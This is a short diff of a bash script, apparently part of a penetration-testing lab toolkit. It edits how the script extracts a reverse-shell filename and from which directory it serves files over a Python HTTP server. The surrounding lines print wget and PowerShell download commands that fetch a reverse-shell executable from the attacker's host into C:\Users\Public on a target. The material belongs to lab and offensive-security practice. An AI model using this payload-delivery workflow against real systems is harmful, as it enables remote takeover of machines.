@@ -187,7 +187,7 @@ done
 echo "Download Reverse Shell"
 echo "Filename is here "
 cat /root/Lab/$IP/sandbox/revshell.sh | cut -d " " -f9 
-fpath=$(cat /root/Lab/$IP/sandbox/revshell.sh | cut -d " " -f9 | cut -d "/" -f5)
+fpath=$(cat /root/Lab/$IP/sandbox/revshell.sh | cut -d " " -f9 | cut -d "/" -f6)
 echo ""
 
 echo "wget http://"$lhost":80/$IP/"$fpath
@@ -201,7 +201,7 @@ str2='http://'$lhost':80/$IP/'$fpath'" -OutFile "C:\Users\Public\reverse-shell.e
 echo $str1$str2
 
 if [ $input = 'y' ] ; then
-   echo "cd /var/www/html/$IP/" >> /root/Lab/$IP/sandbox/temp.sh
+   echo "cd /var/www/html/" >> /root/Lab/$IP/sandbox/temp.sh
    echo "python3 -m http.server 80" >> /root/Lab/$IP/sandbox/temp.sh
 fi 
 
